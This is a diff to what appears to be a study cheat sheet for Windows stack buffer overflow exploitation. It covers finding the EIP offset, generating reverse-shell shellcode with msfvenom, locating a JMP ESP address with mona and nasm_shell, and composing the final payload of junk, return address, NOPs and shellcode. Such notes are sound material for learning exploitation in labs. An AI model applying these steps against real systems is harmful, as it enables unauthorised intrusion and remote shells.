@@ -52,7 +52,7 @@ RESULT: EIP OVERWRITE WITH "A" (41414141)
 RESULT: EIP VALUE
 
 {PATTERN_OFFSET}
-/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q [EIP VALUE]
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q [EIP VALUE REVERSED]
   
 RESULT: OFFSET
 
@@ -84,12 +84,21 @@ msfvenom -p windows/shell/reverse_tcp LPORT=4444 LHOST=10.10.10.10 -b "\x00\x0a\
 
 RESULT: SHELLCODE
 
-## 8- LOCATE JMP JUMP
+## 8- LOCATE JMP
 
-!mona modules (look for modules without protection)
+- !mona modules (look for modules without protection)
 
-RESULT: JMP ESP
+- NASM
+1. usr/share/metasploit-framework/tools/exploit/nasm_shell.rb (displays nasm prompt)
+2. jmp esp
+==>FFE4
+
+!mona find -s '\xff\xe4' -m module.dll
+
+RESULT: JMP ESP ADRESS
 
 ## 9- COMPOSE FINAL EXPLOIT
+
+payload = JUNK + RET_ADRESS + NOPS + SHELLCODE + JUNK
 
 payload = "\x41" * <length> + <ret_address> + "\x90" * 16 + <shellcode> + "\x43" * <remaining_length>
